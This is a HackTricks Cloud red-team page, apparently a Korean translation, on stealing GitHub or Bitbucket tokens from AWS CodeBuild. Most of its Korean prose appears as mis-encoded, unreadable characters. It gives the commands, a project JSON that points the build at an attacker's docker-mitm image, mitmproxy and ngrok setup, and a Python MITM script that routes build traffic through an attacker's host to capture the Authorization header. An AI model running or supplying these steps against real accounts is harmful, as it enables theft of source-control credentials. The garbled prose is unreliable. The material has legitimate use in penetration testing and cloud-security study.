# AWS Codebuild - í† í° ìœ ì¶œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## Github/Bitbucket êµ¬ì„±ëœ í† í° ë³µêµ¬

ë¨¼ì €, ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì†ŒìŠ¤ ìê²© ì¦ëª…ì´ êµ¬ì„±ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”:
```bash
aws codebuild list-source-credentials
```
### ë„ì»¤ ì´ë¯¸ì§€ë¥¼ í†µí•œ ë°©ë²•

ê³„ì •ì— Github ì¸ì¦ì´ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²½ìš°, Codebuildë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì íŠ¸ì˜ ë¹Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆ í•´ë‹¹ ì•¡ì„¸ìŠ¤(GH í† í° ë˜ëŠ” OAuth í† í°)ë¥¼ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ìœ„í•´ ìƒˆë¡œìš´ Codebuild í”„ë¡œì íŠ¸ë¥¼ **ìƒì„±**í•˜ê±°ë‚˜ ê¸°ì¡´ í”„ë¡œì íŠ¸ì˜ **í™˜ê²½ì„ ë³€ê²½**í•˜ì—¬ **ë„ì»¤ ì´ë¯¸ì§€**ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„ì»¤ ì´ë¯¸ì§€ëŠ” [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ì…ë‹ˆë‹¤. ì´ëŠ” ë§¤ìš° ê¸°ë³¸ì ì¸ ë„ì»¤ ì´ë¯¸ì§€ë¡œ, **`https_proxy`**, **`http_proxy`**, **`SSL_CERT_FILE`** í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **`https_proxy`**ì™€ **`http_proxy`**ì— ì§€ì •ëœ í˜¸ìŠ¤íŠ¸ì˜ ëŒ€ë¶€ë¶„ íŠ¸ë˜í”½ì„ ê°€ë¡œì±„ê³ , **`SSL_CERT_FILE`**ì— ì§€ì •ëœ SSL ì¸ì¦ì„œë¥¼ ì‹ ë¢°í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

1. **ìì²´ Docker MitM ì´ë¯¸ì§€ ìƒì„± ë° ì—…ë¡œë“œ**
* ë ˆí¬ì§€í† ë¦¬ì˜ ì§€ì¹¨ì— ë”°ë¼ í”„ë¡ì‹œ IP ì£¼ì†Œë¥¼ ì„¤ì •í•˜ê³  SSL ì¸ì¦ì„œë¥¼ ì„¤ì •í•˜ê³  **ë„ì»¤ ì´ë¯¸ì§€ë¥¼ ë¹Œë“œ**í•©ë‹ˆë‹¤.
* ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ë¡œì˜ ìš”ì²­ì„ ê°€ë¡œì±„ì§€ ì•Šë„ë¡ **`http_proxy`ë¥¼ ì„¤ì •í•˜ì§€ ë§ˆì‹­ì‹œì˜¤**.
* `ngrok tcp 4444`ì™€ ê°™ì´ **`ngrok`**ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì— í”„ë¡ì‹œë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ë„ì»¤ ì´ë¯¸ì§€ë¥¼ ë¹Œë“œí•œ í›„, ì´ë¥¼ **ê³µê°œ ë ˆí¬ì§€í† ë¦¬**(Dockerhub, ECR...)ì— **ì—…ë¡œë“œ**í•©ë‹ˆë‹¤.
2. **í™˜ê²½ ì„¤ì •**
* **ìƒˆë¡œìš´ Codebuild í”„ë¡œì íŠ¸**ë¥¼ ìƒì„±í•˜ê±°ë‚˜ ê¸°ì¡´ í”„ë¡œì íŠ¸ì˜ í™˜ê²½ì„ **ìˆ˜ì •**í•©ë‹ˆë‹¤.
* í”„ë¡œì íŠ¸ë¥¼ **ì´ì „ì— ìƒì„±í•œ ë„ì»¤ ì´ë¯¸ì§€**ë¥¼ ì‚¬ìš©í•˜ë„ë¡ ì„¤ì •í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **í˜¸ìŠ¤íŠ¸ì—ì„œ MitM í”„ë¡ì‹œ ì„¤ì •**

* **Github ë ˆí¬ì§€í† ë¦¬**ì— ë‚˜ì™€ ìˆëŠ”ëŒ€ë¡œ ë‹¤ìŒê³¼ ê°™ì´ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
ì‚¬ìš©ëœ **mitmproxy ë²„ì „ì€ 9.0.1**ì´ì—ˆìœ¼ë©°, ë²„ì „ 10ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤ê³  ë³´ê³ ë˜ì—ˆìŠµë‹ˆë‹¤.
{% endhint %}

4. **ë¹Œë“œ ì‹¤í–‰ ë° ìê²© ì¦ëª… ìº¡ì²˜**

*   **Authorization** í—¤ë”ì—ì„œ í† í°ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

ì´ ì‘ì—…ì€ aws cliì—ì„œë„ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP í”„ë¡œí† ì½œì„ í†µí•œ~~

{% hint style="success" %}
**ì´ ì·¨ì•½ì ì€ 2023ë…„ 2ì›” 20ì¼ ì£¼ê°„ ì¤‘ ì–´ëŠ ì‹œì ì— AWSì— ì˜í•´ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤ (ì•„ë§ˆë„ ê¸ˆìš”ì¼ì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤). ë”°ë¼ì„œ ê³µê²©ìëŠ” ì´ë¥¼ ë” ì´ìƒ ì•…ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤ :)**
{% endhint %}

**CodeBuildì—ì„œ ê¶Œí•œì´ ìƒìŠ¹ëœ ê³µê²©ìëŠ” êµ¬ì„±ëœ Github/Bitbucket í† í°** ë˜ëŠ” ê¶Œí•œì´ OAuthë¥¼ í†µí•´ êµ¬ì„±ëœ ê²½ìš° **ì½”ë“œì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì„ì‹œ OAuth í† í°**ì„ ìœ ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ê³µê²©ìëŠ” CodeBuild í”„ë¡œì íŠ¸ì— í™˜ê²½ ë³€ìˆ˜ **http\_proxy**ì™€ **https\_proxy**ë¥¼ ì¶”ê°€í•˜ì—¬ ìì‹ ì˜ ê¸°ê¸°ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* ê·¸ëŸ° ë‹¤ìŒ, github ì €ì¥ì†Œì˜ URLì„ HTTPS ëŒ€ì‹  HTTPë¡œ ë³€ê²½í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* ê·¸ëŸ° ë‹¤ìŒ, í”„ë¡ì‹œ ë³€ìˆ˜ (http\_proxy ë° https\_proxy)ê°€ ê°€ë¦¬í‚¤ëŠ” í¬íŠ¸ì—ì„œ [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)ì˜ ê¸°ë³¸ ì˜ˆì œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* ë§ˆì§€ë§‰ìœ¼ë¡œ, **í”„ë¡œì íŠ¸ ë¹Œë“œ**ë¥¼ í´ë¦­í•˜ë©´ **ìê²© ì¦ëª…**ì´ **base64ë¡œ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ í…ìŠ¤íŠ¸**ë¡œ mitm í¬íŠ¸ë¡œ ì „ì†¡ë©ë‹ˆë‹¤:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ì´ì œ ê³µê²©ìëŠ” ìì‹ ì˜ ê¸°ê¸°ì—ì„œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ CodeBuild ì„œë¹„ìŠ¤ë¥¼ ì§ì ‘ ì‚¬ìš©í•˜ëŠ” ê²ƒë³´ë‹¤ ë” ì‰½ê²Œ íŠ¹ê¶Œì„ ëª¨ë‘ ë‚˜ì—´í•˜ê³  (ë‚¨ìš©)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
